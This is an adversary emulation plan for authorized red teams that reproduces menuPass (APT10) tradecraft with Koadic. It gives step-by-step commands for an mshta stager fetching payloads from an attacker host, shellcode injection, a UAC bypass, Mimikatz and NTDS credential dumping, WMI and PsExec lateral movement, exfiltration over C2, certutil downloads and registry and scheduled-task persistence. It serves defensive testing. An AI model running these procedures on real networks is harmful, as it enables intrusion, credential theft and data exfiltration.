# Preface
Scenario 2 is designed to emulate activity attributed to menuPass that entails the pursuit of tactical objectives using a command-and-control framework with the operational intent of data exfiltration.  Initial access could be achieved with either spearphishing or an assumed breach in which the emulation team is granted access to a host. The scenario will begin when execution is achieved, and command and control is established.  This scenario differs from Scenario 1 in that instead of uploading an operational toolkit to the victim environment, it employs tactical and sustained malware to execute the subsequent procedures.  In emulating this scenario, you will be assessing your organization's ability to protect, detect, and defend execution, command and control, lateral movement, persistence, and exfiltration.

# Scenario 2 Overview

* Emulating menuPass using tools like Koadic C3 and QuasarRat.
* Scenario 2 begins after a host is compromised, tactical malware has been deployed, and C2 is established.
* Your objectives in Phase 2 are to conduct discovery, escalate privileges, harvest credentials, move laterally, choose specific systems to persist sustained malware (optional), collect, stage, and exfiltrate real or simulated data.

There are many alternatives to the procedures detailed in this scenario.  What is most important is that these procedures have been accomplished, not necessarily how they have been accomplished.  If you lack the resources to complete this scenario procedure-by-procedure, feel free to "white card" or simulate where necessary.

## Prerequisites

* You have either ownership of, or explicit authority and/or authorization to operate against the target network.
* You have established your operational infrastructure.
* You have selected and installed your tactical implant/command-and-control framework.
* If you intend to deploy and persist sustained malware, you have identified and compiled your implant.

## Contents

* [Step 1 - Initial Access](#step-1---menupass-initial-access)
* [Step 2 - Execution](#step-2---menupass-execution)
* [Step 3 - Discovery](#step-3---menupass-discovery)
* [Step 4 - Privilege Escalation](#step-4---menupass-privilege-escalation)
* [Step 5 - Credential Access](#step-5---menupass-credential-access)
* [Step 6 - Lateral Movement](#step-6---menupass-lateral-movement)
* [Step 7 - Exfiltration](#step-7---menupass-exfiltration)
* [Step 8 - Command and Control](#step-8---menupass-command-and-control)
* [Step 9 - Persistence](#step-9---menupass-persistence)

---

## Step 1 - menuPass Initial Access

### Procedures

#### Phishing ([T1566.001](https://attack.mitre.org/techniques/T1566/001), [T1566.002](https://attack.mitre.org/techniques/T1566/002))

Aside from trusted relationship abuse, menuPass is perhaps best known for efforts to achieve initial access to target networks by deploying phishing emails.  These phishing emails deployed tactical malware by one of the four previously discussed methods (macro, .lnk, exploit, masquerading).  menuPass has leveraged this initial access to conduct discovery, pursue credential access, and identify systems of interest on which to deploy and persist sustained malware.

## Step 2 - menuPass Execution

### Procedures

#### 2.A - User Execution: Malicious File ([T1204.002](https://attack.mitre.org/techniques/T1204/002/))

menuPass is reported to have employed LNK files to achieve user execution.  These LNK files utilized scripting languages to invoke the Windows command line, download and execute tactical implants.<sup>[16](https://trendmicro.com/en_us/research/18/c/chessmaster-adds-updated-tools-to-its-arsenal.html)</sup>

MSHTA was used to accomplish execution and situate the tactical implant, Koadic, in memory.  This tactical implant was used to conduct discovery, credential access, lateral movement.

Attacker

```cmd
./koadic
koadic: use stager/js/mshta
(koadic: sta/js/mshta)# set SRVHOST #{ip_address}
(koadic: sta/js/mshta)# set SRVPORT #{listening_port}
(koadic: sta/js/mshta)# run
[>] mshta http://#{ip_address/#{file_name}
```

Target

```cmd
C:\Users\Victim> mshta http://{#ip_address}/#{file_name}
```

#### 2.B (Optional)

In some instances, soon after establishing C2, menuPass is reported to have introduced an additional implant to enhance operational capabilities.<sup>[15](http://blog.trendmicro.com/trendlabs-security-intelligence/chessmasters-new-strategy-evolving-tools-tactics/)</sup>  <sup>[16](https://trendmicro.com/en_us/research/18/c/chessmaster-adds-updated-tools-to-its-arsenal.html)</sup>  They did so by using Koadic to inject arbitrary shellcode into a process.  Excel must be present on the host to use this procedure.

```cmd
(koadic: sta/js/mshta)# use implant/inject/shellcode_excel
(koadic: implant/inj/shellcode_excel)# set shellcode #{ASCIIhex_shellcode}
(koadic: implant/inj/shellcode_excel)# set zombie #{zombie_id}
(koadic: implant/inj/shellcode_excel)# run
```
## Step 3 - menuPass Discovery

After achieving initial execution, menuPass actors are reported to have performed cursory situational awareness checks.  These checks are intended to determine suitability for implantation with a sustained implant.<sup>[16](https://trendmicro.com/en_us/research/18/c/chessmaster-adds-updated-tools-to-its-arsenal.html)</sup>

### Procedures

#### 3.A - System Network Configuration Discovery ([T1016](https://attack.mitre.org/techniques/T1016/)), System Network Connections Discovery ([T1049](https://attack.mitre.org/techniques/T1049/)) <sup>[16](https://trendmicro.com/en_us/research/18/c/chessmaster-adds-updated-tools-to-its-arsenal.html)</sup>

Attacker

```cmd
(koadic: sta/js/mshta)# zombies
(koadic: sta/js/mshta)# cmdshell #{zombie_id}
C:\Users\Victim> ipconfig /all
C:\Users\Victim> tasklist /v
C:\Users\Victim> net view
C:\Users\Victim> netstat -ano
```

#### 3.B

```cmd
(koadic: sta/js/mshta)# use implant/scan/tcp
(koadic: imp/sca/tcp)# set rhosts #{remote_hosts}
(koadic: imp/sca/tcp)# set rports #{ports_to_scan}
(koadic: imp/sca/tcp)# set zombies #{zombie_id}
(koadic: imp/sca/tcp)# run
```

## Step 4 - menuPass Privilege Escalation

In Scenario 1, menuPass is presumed to have initially accessed the target environment using compromised credentials that granted elevated privileges.  As such, privilege escalation was not necessary.  menuPass is reported to have sought access to additional credentials to ensure freedom of movement throughout the domain.  This elevated access was a result of the method of initial access.

Scenario 2 differs in this regard as the initial method of access is presumed to be phishing.  Phishing does not always result in elevated access.  As such, elevation to increase process integrity is required to use the tools that grant additional credential access.  As such, we suggest either "white carding" Administrative access or leveraging Koadic's "elevate" modules to attempt escalation.

#### 4.A

```cmd
(koadic: sta/js/mshta)# use implant/elevate/bypassuac_eventvwr
(koadic: implant/ele/bypassuac_eventvwr)# set payload #{payload_id}
(koadic: implant/ele/bypassuac_eventvwr)# set zombie #{zombie_id}
(koadic: implant/ele/bypassuac_eventvwr)# run
```

Check Privileges

```cmd
(koadic: implant/ele/bypassuac_eventvwr)# zombies #{zombie_id}
```

## Step 5 - menuPass Credential Access

#### 5.A

```cmd
(koadic: sta/js/mshta)# use implant/inject/mimikatz_dotnet2js
(koadic: imp/inj/mimikatz_dotnet2js)# set mimicmd #{mimikatz_command}
(koadic: imp/inj/mimikatz_dotnet2js)# set zombie #{zombie_id}
```

#### 5.B - OS Credential Dumping: NTDS ([T1003.003](https://attack.mitre.org/techniques/T1003/003/))

menuPass is reported to have sought access to additional credentials to ensure freedom of movement throughout the domain.

```cmd
(koadic: sta/js/mshta)# use implant/gather/hashdump_dc
(koadic: imp/gat/hashdump_dc)# set lpath #{local_file_path}
(koadic: imp/gat/hashdump_dc)# set drive #{drive_to_shadow_copy}
(koadic: imp/gat/hashdump_dc)# set rpath #{remote_file_save_path}
(koadic: imp/gat/hashdump_dc)# set certutil true
(koadic: imp/gat/hashdump_dc)# set zombie #{zombie_id}
(koadic: imp/gat/hashdump_dc)# run
```

### Alternative Procedure

### Ntdsutil<sup>[32](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)</sup>

This procedure leverages a tool commonly featured on Windows Server, ntdsutil.exe, to dump the SYSTEM AND SECURITY registry hives from the domain controller.  These files will be copied to a specified directory and must be egressed from the network in order to dump credentials locally.  This procedure requires Administrative privileges and access to the domain controller but does not require credentials.

Ntdsutil.exe must be present on the host.

```cmd
(koadic: sta/js/mshta)# cmdshell #{zombie_id}
C:\Users\Victim> powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\ProgramData\Temp' q q"
```

Download the file

```cmd
(koadic: sta/js/mshta)# use implant/utils/download_file
(koadic: imp/uti/download_file)# set lpath #{local_file_save_path}
(koadic: imp/uti/download_file)# set rfile #{file_to_download}
(koadic: imp/uti/download_file)# set certutil true
(koadic: imp/uti/download_file)# set zombie #{zombie_id}
(koadic: imp/uti/download_file)# run
```

#### Dumping Credentials Locally
After copying and exfiltrating the NTDS.dit file, you will use Impacket's secretsdump to dump credentials locally.

```cmd
secretsdump.exe -system #{system_hive_local_path\SYSTEM} -security #{security_hive_local_path\SECURITY} -ntds #{ntds_local_path\ntds.dit} local
```

## Step 6 - menuPass Lateral Movement

#### 6.A - Windows Management Instrumentation ([T1047](https://attack.mitre.org/T1047/))

```cmd
(koadic: sta/js/mshta)# use implant/pivot/stage_wmi
(koadic: implant/piv/stage_wmi)# set rhost #{remote_host}
(koadic: implant/piv/stage_wmi)# set smbuser #{user_name}
(koadic: implant/piv/stage_wmi)# set smbpass #{password}
(koadic: implant/piv/stage_wmi)# set smbdomain #{domain}
(koadic: implant/piv/stage_wmi)# set payload #{payload_id}
(koadic: implant/piv/stage_wmi)# set zombie #{zombie_id}
(koadic: implant/piv/stage_wmi)# run

```

#### Alternative Procedure

### System Services: Service Execution ([T1569.002](https://attack.mitre.org/techniques/T1569/002))

Upload PsExec to the host

```cmd
(koadic: sta/js/mshta)# use implant/utils/upload_file
(koadic: imp/uti/upload_file)# set lfile #{local_file_to_upload}
(koadic: imp/uti/upload_file)# set zombie #{zombie_id}
(koadic: imp/uti/upload_file)# run
```

PsExec to remote host

```cmd
(koadic: sta/js/mshta)# use implant/pivot/exec_psexec
(koadic: implant/piv/exec-psexec)# set cmd #{command_to_run}
(koadic: implant/piv/exec-psexec)# set rhost #{remote_host}
(koadic: implant/piv/exec-psexec)# set smbuser #{user_name}
(koadic: implant/piv/exec-psexec)# set smbpass #{password}
(koadic: implant/piv/exec-psexec)# set credid #{credential_ip}
(koadic: implant/piv/exec-psexec)# set rpath #{remote_path_to_psexec}
(koadic: implant/piv/exec-psexec)# set zombie #{zombie_id}
(koadic: implant/piv/exec-psexec)# run
```

## Step 7 - menuPass Exfiltration

#### 7.A - Exfiltration Over C2 Channel ([T1041](https://attack.mitre.org/techniques/T1041/))

```cmd
(koadic: sta/js/mshta)# use implant/utils/download_file
(koadic: imp/uti/download_file)# set lpath #{local_file_save_path}
(koadic: imp/uti/download_file)# set rfile #{file_to_download}
(koadic: imp/uti/download_file)# set certutil true
(koadic: imp/uti/download_file)# set zombie #{zombie_id}
(koadic: imp/uti/download_file)# run
```

## Step 8 - menuPass Command and Control

menuPass actors are reported to have introduced sustained malware to target networks.  Poison Ivy, PlugX, and more recently, the publicly available QuasarRat are reported to have been used by menuPass actors.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup> <sup>[11](https://blog.trendmicro.com/trendlabs-security-intelligence/chessmaster-cyber-espionage-campaign/)</sup> <sup>[13](https://blogs.blackberry.com/en/2019/06/threat-spotlight-menupass-quasarrat-backdoor)</sup>  <sup>[25](https://fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-)</sup> These implants provide the attacker with additional capabilities.  More importantly, these implants are used to ensure persistent access to the target network.

menuPass actors are reported to have conducted ingress tool transfer using several different techniques.  You may choose to use Koadic's built-in functionality or leverage tools native to the Windows environment.  menuPass actors are reported to have done both.<sup>[15](http://blog.trendmicro.com/trendlabs-security-intelligence/chessmasters-new-strategy-evolving-tools-tactics/)</sup> <sup>[16](https://trendmicro.com/en_us/research/18/c/chessmaster-adds-updated-tools-to-its-arsenal.html)</sup>

### Procedures

#### 8.A - Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))

menuPass may have accessed the command-line to use a tool native to the Windows environment (certutil) to download and decode additional capabilities.<sup>[16](https://trendmicro.com/en_us/research/18/c/chessmaster-adds-updated-tools-to-its-arsenal.html)</sup>

```cmd
(koadic: sta/js/mshta)# cmdshell #{zombie_id}
C:\Users\Victim> certutil.exe -urlcache -split -f https://www.#{payload_server.com}/#{file}
```

#### Alternative Procedure - Koadic File Upload

```cmd
(koadic: sta/js/mshta)# use implant/utils/upload_file
(koadic: imp/uti/upload_file)# set lfile #{local_file_to_upload}
(koadic: imp/uti/upload_file)# set zombie #{zombie_id}
(koadic: imp/uti/upload_file)# run
```

## Step 9 - menuPass Persistence

menuPass actors are reported to have persisted both tactical and sustained malware.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup> <sup>[5](https://www.fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html)</sup> <sup>[11](https://blog.trendmicro.com/trendlabs-security-intelligence/chessmaster-cyber-espionage-campaign/)</sup> <sup>[25](https://fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-)</sup>  Tactical malware should be thought of as the "work horse."  It is the tool used to accomplish tactical objectives and is therefore, more likely to be detected.  menuPass is reported to have been deliberate in the deployment and persistence of sustained malware.  These implants were employed to facilitate long-term access to target environments.<sup>[11](https://blog.trendmicro.com/trendlabs-security-intelligence/chessmaster-cyber-espionage-campaign/)</sup>  Sustained malware was deployed to systems that afforded the ability to blend in, remain undetected, or facilitate access to a resource deemed essential.  Select your host for persistence carefully, and do not persist tactical and sustained implants on the same host.

#### 9.A - Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder ([T1547.001](https://attack.mitre.org/techniques/T1547/001/))

Tactical Malware

```cmd
(koadic: sta/js/mshta)# use implant/persist/registry
(koadic: imp/per/registry)# set payload #{payload_id}
(koadic: imp/per/registry)# set zombie #{zombie_id}
(koadic: imp/per/registry)# run
```

#### Alternative Procedure: Scheduled Task/Job: Scheduled Task ([T1053.005](https://attack.mitre.org/techniques/T1053/005))

Tactical Malware

```cmd
(koadic: sta/js/mshta)# use implant/persist/schtasks
(koadic: imp/per/schtasks)# set payload #{payload_id}
(koadic: imp/per/schtasks)# set zombie #{zombie_id}
(koadic: imp/per/schtasks)# run
```

Sustained Malware

menuPass actors are reported to have persisted implants using several different procedures to include, creating scheduled tasks, registry keys, Windows services, and dropping LNK files in the Startup folder.<sup>[4](https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)</sup> <sup>[5](https://www.fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html)</sup> <sup>[11](https://blog.trendmicro.com/trendlabs-security-intelligence/chessmaster-cyber-espionage-campaign/)</sup> <sup>[25](https://fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-)</sup>  If you choose to use QuasarRAT as your sustained implant, may either select "Run Client when the computer starts" from the Client Builder menu when generating your implant or do so using the Windows command line.  QuasarRAT creates a registry run key and schedules a task in order to establish persistence.

---

## Additional Plan Resources

- [Intelligence Summary](/menuPass/Intelligence_Summary.md)
- [Operations Flow](/menuPass/Operations_Flow.md)
- [Emulation Plan](/menuPass/Emulation_Plan/README.md)
  - [Resource Development](/menuPass/Emulation_Plan/ResourceDevelopment.md)
  - [Infrastructure](/menuPass/Emulation_Plan/Infrastructure.md)
  - [Scenario 1](/menuPass/Emulation_Plan/Scenario1.md)
  - [Scenario 2](/menuPass/Emulation_Plan/Scenario2.md)
  - [YAML](/menuPass/Emulation_Plan/yaml)
- [Issues](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues)
- [Change Log](/menuPass/CHANGE_LOG.md)